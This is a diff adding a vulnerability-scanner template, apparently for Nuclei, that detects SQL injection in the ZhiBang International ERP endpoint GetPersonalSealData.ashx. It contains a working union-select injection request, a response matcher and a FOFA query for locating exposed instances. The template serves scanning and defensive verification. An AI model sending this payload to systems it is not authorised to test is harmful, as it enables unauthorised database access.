@@ -1,0 +1,33 @@
+id: ZhiBang-ERP-SQLi
+
+info:
+  name: 智邦国际ERP系统 GetPersonalSealData.ashx 存在sql注入漏洞
+  author: changge
+  severity: info
+  description: 智邦国际以“一体化”为顶层设计理念，全面布局产品生态，满足不同行业、不同管理层次、不同信息化程度的企业需求。智邦国际ERP系统GetPersonalSealData.ashx接口处存在sql注入漏洞，攻击者可利用此漏洞获取数据库敏感信息。
+  metadata:
+    fofa-query: icon_hash="-682445886"
+    verified: true
+    max-request: 1
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - raw:
+      - |+
+        GET /SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=-1%20union%20select%201-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body,"\"SealData\":\"1\"") && status_code == 200'
